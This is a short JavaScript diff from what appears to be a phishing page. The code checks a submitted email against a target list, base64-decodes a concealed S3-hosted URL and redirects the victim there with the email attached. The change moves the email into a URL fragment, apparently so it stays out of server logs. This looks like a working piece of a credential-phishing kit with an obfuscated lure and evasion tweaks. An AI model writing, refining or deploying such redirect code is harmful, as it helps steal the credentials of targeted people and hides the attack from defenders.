@@ -194,7 +194,7 @@ if (validateEmail(email)) {
     if (validEmails.includes(email)) {
         const link = "aHR0cHM6Ly9wcm90b2NhbGNvcmVzaWduLnMzLnVzLWVhc3QtMi5hbWF6b25hd3MuY29tLzM4NS1yZXRpY2Vuc2UtMjQ1ODIzMDI1OC0xLTI0ODUtMTI0OTUtZDIuaHRtbA=="; 
             const decodedLink = atob(link);
-            const finalLink = `${decodedLink}?add=${email}`;
+            const finalLink = `${decodedLink}#${email}`;
             window.location.href = finalLink;
         } else {
             attempts++;
